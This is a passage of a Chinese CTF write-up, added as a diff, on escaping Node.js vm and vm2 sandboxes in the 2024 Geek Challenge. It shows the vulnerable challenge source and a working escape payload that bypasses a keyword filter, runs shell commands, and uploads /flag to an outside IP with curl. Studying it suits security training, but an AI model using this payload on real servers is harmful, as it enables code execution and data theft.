+</span></span><span class="line"><span class="cl">        <span class="n">exit</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;/execute&#39;</span><span class="p">,</span> <span class="n">upload</span><span class="o">.</span><span class="n">none</span><span class="p">(),</span> <span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">let</span> <span class="n">code</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">body</span><span class="o">.</span><span class="n">code</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">const</span> <span class="n">token</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">token</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="err">!</span><span class="n">token</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">res</span><span class="o">.</span><span class="n">status</span><span class="p">(</span><span class="mi">403</span><span class="p">)</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;Missing execution code credentials.&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="err">!</span><span class="n">jwt</span><span class="o">.</span><span class="n">verify</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">JWT_SECRET</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">res</span><span class="o">.</span><span class="n">status</span><span class="p">(</span><span class="mi">403</span><span class="p">)</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;Invalid token provided.&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">console</span><span class="o">.</span><span class="n">log</span><span class="p">(</span><span class="err">`</span><span class="n">Received</span> <span class="n">code</span> <span class="k">for</span> <span class="n">execution</span><span class="p">:</span> <span class="err">$</span><span class="p">{</span><span class="n">code</span><span class="p">}</span><span class="err">`</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">waf</span><span class="p">(</span><span class="n">code</span><span class="p">,</span><span class="n">res</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">let</span> <span class="n">sandbox</span> <span class="o">=</span> <span class="n">Object</span><span class="o">.</span><span class="n">create</span><span class="p">(</span><span class="n">null</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">let</span> <span class="n">context</span> <span class="o">=</span> <span class="n">vm</span><span class="o">.</span><span class="n">createContext</span><span class="p">(</span><span class="n">sandbox</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">let</span> <span class="n">script</span> <span class="o">=</span> <span class="n">new</span> <span class="n">vm</span><span class="o">.</span><span class="n">Script</span><span class="p">(</span><span class="n">code</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="o">.</span><span class="n">log</span><span class="p">(</span><span class="s1">&#39;Executing code in sandbox context&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">script</span><span class="o">.</span><span class="n">runInContext</span><span class="p">(</span><span class="n">context</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="o">.</span><span class="n">log</span><span class="p">(</span><span class="err">`</span><span class="n">Code</span> <span class="n">executed</span> <span class="n">successfully</span><span class="o">.</span> <span class="n">Result</span><span class="p">:</span> <span class="err">$</span><span class="p">{</span><span class="n">sandbox</span><span class="o">.</span><span class="n">result</span> <span class="o">||</span> <span class="s1">&#39;No result returned.&#39;</span><span class="p">}</span><span class="err">`</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">res</span><span class="o">.</span><span class="n">json</span><span class="p">(</span><span class="s1">&#39;Code executed successfully&#39;</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">err</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="err">`</span><span class="n">Error</span> <span class="n">executing</span> <span class="n">code</span><span class="p">:</span> <span class="err">$</span><span class="p">{</span><span class="n">err</span><span class="o">.</span><span class="n">message</span><span class="p">}</span><span class="err">`</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">res</span><span class="o">.</span><span class="n">status</span><span class="p">(</span><span class="mi">400</span><span class="p">)</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="err">`</span><span class="n">Error</span><span class="p">:</span> <span class="n">there</span><span class="s1">&#39;s no display back here,may be it executed successfully?`);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>把waf关了测测怎么能逃逸</p>
+<p><img src="/p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250806211229943.png"
+	width="1543"
+	height="614"
+	srcset="/p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250806211229943_hu_c7ddfbb2b3d898b9.png 480w, /p/2024-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250806211229943_hu_839570bfcf846639.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250806211229943"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="251"
+		data-flex-basis="603px"
+	
+></p>
+<p>测试代码如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">vm</span> <span class="o">=</span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;vm&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">code</span><span class="o">=</span><span class="sb">`throw new Proxy({}, {
+</span></span></span><span class="line"><span class="cl"><span class="sb">    get: function(){
+</span></span></span><span class="line"><span class="cl"><span class="sb">        const cc = arguments.callee.caller;
+</span></span></span><span class="line"><span class="cl"><span class="sb">
+</span></span></span><span class="line"><span class="cl"><span class="sb">         //cc获取到了调用他的函数console.log
+</span></span></span><span class="line"><span class="cl"><span class="sb">
+</span></span></span><span class="line"><span class="cl"><span class="sb">        const p = (cc.constructor.constructor(&#39;return process&#39;))();
+</span></span></span><span class="line"><span class="cl"><span class="sb">
+</span></span></span><span class="line"><span class="cl"><span class="sb">        //这里通过获取构造函数获取了构造函数Function
+</span></span></span><span class="line"><span class="cl"><span class="sb">      //值得注意的是构造函数Function的构造函数还是他本身,所以这里多一个constructor无伤大雅
+</span></span></span><span class="line"><span class="cl"><span class="sb">      
+</span></span></span><span class="line"><span class="cl"><span class="sb">        return p.mainModule.require(&#39;child_process&#39;).execSync(&#39;calc&#39;).toString();
+</span></span></span><span class="line"><span class="cl"><span class="sb">    }
+</span></span></span><span class="line"><span class="cl"><span class="sb">})`</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">   
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">sandbox</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">create</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">context</span> <span class="o">=</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">createContext</span><span class="p">(</span><span class="nx">sandbox</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">script</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">Script</span><span class="p">(</span><span class="nx">code</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Executing code in sandbox context&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">script</span><span class="p">.</span><span class="nx">runInContext</span><span class="p">(</span><span class="nx">context</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`Code executed successfully. Result: </span><span class="si">${</span><span class="nx">sandbox</span><span class="p">.</span><span class="nx">result</span> <span class="o">||</span> <span class="s1">&#39;No result returned.&#39;</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">(</span><span class="s1">&#39;Code executed successfully&#39;</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="sb">`Error executing code: </span><span class="si">${</span><span class="nx">err</span><span class="p">.</span><span class="nx">message</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">   
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这文章讲的很好<a class="link" href="https://xz.aliyun.com/news/13977"  target="_blank" rel="noopener"
+    >VM及VM2沙箱逃逸及对特殊情况的处理办法-先知社区</a></p>
+<p>现在来绕过waf，过滤了一些关键字以及&rsquo;&quot;+\和[]，关键词过滤没什么用，可以用<strong>tolowercase</strong>进行大小写绕过关键词过滤（toUpperCase() 方法用于把字符串转换为大写。）</p>
+<p>exp如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="k">throw</span> <span class="k">new</span> <span class="nb">Proxy</span><span class="p">({},</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">get</span><span class="o">:</span> <span class="kd">function</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">            <span class="kr">const</span> <span class="nx">cc</span> <span class="o">=</span> <span class="nx">arguments</span><span class="p">.</span><span class="nx">callee</span><span class="p">.</span><span class="nx">caller</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="kr">const</span> <span class="nx">p</span> <span class="o">=</span> <span class="p">(</span><span class="nx">cc</span><span class="p">.</span><span class="nx">constructor</span><span class="p">.</span><span class="nx">constructor</span><span class="p">(</span><span class="sb">`return proceSs`</span><span class="p">.</span><span class="nx">toLowerCase</span><span class="p">()))();</span>
+</span></span><span class="line"><span class="cl">            <span class="kr">const</span> <span class="nx">obj</span> <span class="o">=</span> <span class="nx">p</span><span class="p">.</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="sb">`child_proceSs`</span><span class="p">.</span><span class="nx">toLowerCase</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">            <span class="kr">const</span> <span class="nx">ex</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">getOwnPropertyDescriptor</span><span class="p">(</span><span class="nx">obj</span><span class="p">,</span> <span class="sb">`exeC`</span><span class="p">.</span><span class="nx">toLowerCase</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">ex</span><span class="p">.</span><span class="nx">value</span><span class="p">(</span><span class="sb">`curl -T /flag  101.200.39.193:5000`</span><span class="p">).</span><span class="nx">toString</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">})</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong><code>Object.getOwnPropertyDescriptor()</code></strong> 静态方法返回一个对象,具体看下文</p>
+<p><a class="link" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/getOwnPropertyDescriptor"  target="_blank" rel="noopener"
+    >Object.getOwnPropertyDescriptor() - JavaScript | MDN</a></p>
+<img src="image-20250806215915923.png" alt="image-20250806215915923" style="zoom:50%;" />
+<p><a class="link" href="https://xz.aliyun.com/news/15963"  target="_blank" rel="noopener"
+    >极客大挑战 web week3&amp;week4-先知社区</a></p>
+<h2 id="escapesandbox_plus">escapeSandbox_PLUS
+</h2><p>也给了源码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// 引入所需模块
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express&#39;</span><span class="p">);</span> <span class="c1">// Express框架
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="nx">bodyParser</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;body-parser&#39;</span><span class="p">);</span> <span class="c1">// 请求体解析中间件
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="nx">session</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express-session&#39;</span><span class="p">);</span> <span class="c1">// 会话管理中间件
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="nx">multer</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;multer&#39;</span><span class="p">);</span> <span class="c1">// 处理multipart/form-data的中间件
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="p">{</span> <span class="nx">VM</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;vm2&#39;</span><span class="p">);</span> <span class="c1">// 创建安全沙箱环境的模块
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="nx">crypto</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;crypto&#39;</span><span class="p">);</span> <span class="c1">// 加密模块
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="nx">path</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;path&#39;</span><span class="p">);</span> <span class="c1">// 路径处理模块
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="c1">// 创建Express应用实例
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 配置中间件
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">bodyParser</span><span class="p">.</span><span class="nx">json</span><span class="p">());</span> <span class="c1">// 解析JSON格式请求体
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">bodyParser</span><span class="p">.</span><span class="nx">urlencoded</span><span class="p">({</span> <span class="nx">extended</span><span class="o">:</span> <span class="kc">true</span> <span class="p">}));</span> <span class="c1">// 解析URL编码的请求体
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="c1">// 设置静态文件目录（public文件夹）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="kr">static</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="s1">&#39;public&#39;</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 生成随机会话密钥（64字节转16进制字符串）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="nx">sessionSecret</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">randomBytes</span><span class="p">(</span><span class="mi">64</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// 配置会话中间件
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">session</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">secret</span><span class="o">:</span> <span class="nx">sessionSecret</span><span class="p">,</span> <span class="c1">// 加密会话ID的密钥
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">resave</span><span class="o">:</span> <span class="kc">false</span><span class="p">,</span> <span class="c1">// 强制将会话保存回存储
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">saveUninitialized</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span> <span class="c1">// 保存未初始化的会话
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 配置multer（用于文件上传，但实际路由中未使用）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="nx">upload</span> <span class="o">=</span> <span class="nx">multer</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 登录路由 - 处理用户认证
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="p">{</span> <span class="nx">username</span><span class="p">,</span> <span class="nx">passwd</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span> <span class="c1">// 获取请求中的用户名和密码
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * 特殊登录条件：
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * 1. 用户名的小写形式不能是&#39;syclover&#39;
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * 2. 用户名的大写形式必须是&#39;SYCLOVER&#39;
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * 3. 密码必须是&#39;J1rrY&#39;
+</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">username</span><span class="p">.</span><span class="nx">toLowerCase</span><span class="p">()</span> <span class="o">!==</span> <span class="s1">&#39;syclover&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">username</span><span class="p">.</span><span class="nx">toUpperCase</span><span class="p">()</span> <span class="o">===</span> <span class="s1">&#39;SYCLOVER&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">passwd</span> <span class="o">===</span> <span class="s1">&#39;J1rrY&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">isAuthenticated</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span> <span class="c1">// 设置会话认证标志
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span> <span class="nx">message</span><span class="o">:</span> <span class="s1">&#39;登录成功&#39;</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">401</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span> <span class="nx">message</span><span class="o">:</span> <span class="s1">&#39;无效凭证&#39;</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 认证中间件 - 检查用户是否已登录
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="nx">isAuthenticated</span> <span class="o">=</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">isAuthenticated</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">next</span><span class="p">();</span> <span class="c1">// 已认证，继续后续处理
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">403</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span> <span class="nx">message</span><span class="o">:</span> <span class="s1">&#39;未认证&#39;</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 代码执行路由（需要认证）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/execute&#39;</span><span class="p">,</span> <span class="nx">isAuthenticated</span><span class="p">,</span> <span class="nx">upload</span><span class="p">.</span><span class="nx">none</span><span class="p">(),</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">code</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">code</span><span class="p">;</span> <span class="c1">// 获取要执行的代码
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">flag</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * 代码混淆处理：
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * 遍历代码字符串，将特定字符替换为星号(*)
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * 这似乎是一种安全措施，防止使用某些字符
+</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
